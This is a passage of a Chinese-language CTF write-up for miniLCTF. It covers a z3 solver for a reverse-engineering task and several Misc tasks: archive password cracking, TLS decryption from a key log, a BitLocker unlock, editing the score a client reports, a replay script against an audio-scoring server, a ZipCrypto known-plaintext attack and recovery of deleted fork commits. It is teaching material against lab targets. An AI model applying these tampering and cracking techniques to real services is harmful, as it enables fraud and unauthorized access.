![](/images/Hsk1bxM3fop3rTxjnr9cvaeSnyb.png)

然后手动提取方程组写个 z3 求解就行

```python
from z3 import *

enc = [0xFD, 0xC7, 0xF8, 0x93, 0x9E, 0x66, 0xC0, 0xA9, 0xFF, 0xF3, 0xDC, 0xE5]
input = [BitVec(f"input{i}", 8) for i in range(12)]
s = Solver()
for i in range(12):
 s.add(input[i] >=0, input[i] <= 26)
Temp =[0]*12
Temp[0]=0x03*input[0] + 0x03*input[1] + 0x03*input[2] + 0x03*input[3] + 0x01*input[4] + 0x01*input[5] + 0x03*input[7] + 0x02*input[10] +0x03*input[11]
Temp[1]=0x03*input[0] + 0x02*input[1] + 0x02*input[2] + 0x02*input[3] + 0x02*input[4] + 0x02*input[6] + 0x01*input[7] + 0x02*input[8]
Temp[2]=0x02*input[0] + 0x03*input[2] + 0x03*input[5] + 0x03*input[6] + 0x01*input[7] + 0x01*input[8] + 0x02*input[9] + 0x03*input[10]+ 0x01*input[11]
Temp[3]=0x02*input[2] + 0x03*input[6] + 0x02*input[7] + 0x03*input[8] + 0x02*input[10]
Temp[4]=0x01*input[0] + 0x02*input[1] + 0x02*input[2] + 0x01*input[3] + 0x02*input[5] + 0x01*input[8] + 0x02*input[10] + 0x01*input[11]
Temp[5]=0x03*input[1] + 0x03*input[5] + 0x02*input[6] + 0x02*input[10] + 0x01*input[11]
Temp[6]=0x01*input[0] + 0x01*input[1] + 0x03*input[2] + 0x01*input[5] + 0x02*input[6] + 0x02*input[7] + 0x02*input[8] + 0x02*input[9] + 0x01*input[10] + 0x02*input[11]
Temp[7]=0x03*input[0] + 0x02*input[1] + 0x02*input[2] + 0x02*input[4] + 0x01*input[5] + 0x02*input[8] + 0x01*input[10] + 0x01*input[11]
Temp[8]=0x03*input[0] + 0x03*input[1] + 0x03*input[2] + 0x03*input[3] + 0x01*input[4] + 0x02*input[5] + 0x02*input[6] + 0x02*input[9] + 0x02*input[11]
Temp[9]=0x01*input[0] + 0x01*input[1] + 0x02*input[3] + 0x02*input[4] + 0x02*input[5] + 0x02*input[6] + 0x02*input[7] + 0x02*input[8] + 0x03*input[10] + 0x01*input[11]
Temp[10]=0x03*input[1] + 0x02*input[2] + 0x01*input[5] + 0x01*input[6] + 0x02*input[7] + 0x03*input[8] + 0x03*input[9] + 0x03*input[10] + 0x01*input[11]
Temp[11]=0x03*input[0] + 0x03*input[1] + 0x03*input[3] + 0x01*input[4] + 0x02*input[5] + 0x03*input[6] + 0x02*input[7] + 0x01*input[9] + 0x02*input[10] + 0x03*input[11]

for j in range(12):
  s.add(Temp[j] == enc[j])
if s.check() == sat:
    m = s.model()
    solution = [m.evaluate(input[i]).as_long() for i in range(12)]
    Flag = [(v+0x61)&0xFF for v in solution]
    flag = ''.join(chr(c) for c in Flag)
    print("miniLCTF{"+flag+"}")
else:
    print("No solution found")
# miniLCTF{favyxwekppoa}
```

## Misc

### MiniForensicsⅠ

passware 工具爆出 ai.rar 密码

![](/images/U3kEbiCMXoLtW9xoOvwcrUEKnrb.png)

rar 里面还隐藏了个 ssl.log 数据，winrar 打开即可看到

配合 wireshark，放置 ssllog 后解密 ssl 数据得到几个 upload，分别提取 lock.zip 以及 Bitlock 恢复密钥 txt。

![](/images/UCWdbZmsvo3SfsxW9jqcXB3FnTc.png)

lock.zip 等待第二题备用

得到 bitlock 恢复密钥，解开加密硬盘后得到 c.txt，使用脚本绘制

```python
import matplotlib.pyplot as plt
import numpy as np

def read_coordinates(_filename_):
    x_coords = []
    y_coords = []
    
    with open(filename, 'r') as file:
        for line in file:
            x, y = line.strip().split(',')
            x_coords.append(float(x))
            y_coords.append(-float(y))
    
    return x_coords, y_coords

def plot_coordinates(_x_coords_, _y_coords_):
    plt.figure(_figsize_=(12, 12))
    
    plt.scatter(x_coords, y_coords, 
               _s_=3,
               _alpha_=0.1,
               _c_='blue',
               _marker_='.') 
    
    plt.xlabel('X')
    plt.ylabel('Y')
    plt.title('Coordinate Plot')
    
    plt.axis('equal')
    
    plt.show()

try:
    filename = r'c.txt'
    x_coords, y_coords = read_coordinates(filename)

    plot_coordinates(x_coords, y_coords)
except Exception as e:
    print(f"错误: {e}")
```

![](/images/HdRXb4R31oiZiDxQEm0cSycjnZg.png)

得到提示，b=(a+c)/2，那么 a=(b*2)-c

```python
import matplotlib.pyplot as plt
import numpy as np

def read_coordinates(_filename_):
    x_coords = []
    y_coords = []
    
    with open(filename, 'r') as file:
        for line in file:
            x, y = line.strip().split(',')
            x_coords.append(float(x))
            y_coords.append(-float(y))
    
    return x_coords, y_coords

def plot_coordinates(_x_coords_, _y_coords_):
    plt.figure(_figsize_=(12, 12))
    
    plt.scatter(x_coords, y_coords, 
               _s_=3,
               _alpha_=0.1,
               _c_='blue',
               _marker_='.') 
    
    plt.xlabel('X')
    plt.ylabel('Y')
    plt.title('Coordinate Plot')
    
    plt.axis('equal')
    
    plt.show()

try:
    filename = r'c.txt'
    filename2 = r'b.txt'
    x_coords, y_coords = read_coordinates(filename)
    x_coords2, y_coords2 = read_coordinates(filename2)

    result_x = []
    result_y = []

    for i in range(len(x_coords)):
        new_x = x_coords2[i] * 2 - x_coords[i]
        new_y = y_coords2[i] * 2 - y_coords[i]
        result_x.append(new_x)
        result_y.append(new_y)
    plot_coordinates(result_x, result_y)
except Exception as e:
    print(f"错误: {e}")
```

![](/images/D9OWbPcueoQoA4xcgLicsYUanqb.png)

### 吃豆人

F12 替代内容，修改 js 中上报的 score 值即可获得 flag

### 麦霸评分

将完整原录音重放提交即可

exp

```python
import requests

base = "http://127.0.0.1:62188"

audio = requests.get(base+"/original.wav").content

# save
with open("recording.wav", "wb") as f:
    f.write(audio)

resp = requests.post(base+"/compare-recording", files={"audio": open("recording.wav", "rb")}).json()
print(resp)
```

### MiniForensicsII

接上文，获取到 lock.zip，压缩包内为 ZipCrypto Store，对 PNG 明文攻击获取压缩包内容，breadcrumb.txt 解 base64 提示来到 [https://github.com/root-admin-user/what_do_you_wanna_find.git](https://github.com/root-admin-user/what_do_you_wanna_find.git)

通过查阅仓库 Fork Event 定位到 [vfvfvf-jc](https://github.com/root-admin-user/what_do_you_wanna_find/commits?author=vfvfvf-jc) 这个用户 fork 了仓库提交了 push 后删除。

根据 CFOR 特性（Cross Fork Object Reference），可以查看该提交内容

[https://github.com/root-admin-user/what_do_you_wanna_find/commit/89045a3653af483b6bb390e27c10db16873a60d1](https://github.com/root-admin-user/what_do_you_wanna_find/commit/89045a3653af483b6bb390e27c10db16873a60d1)

获取到 flag，完成
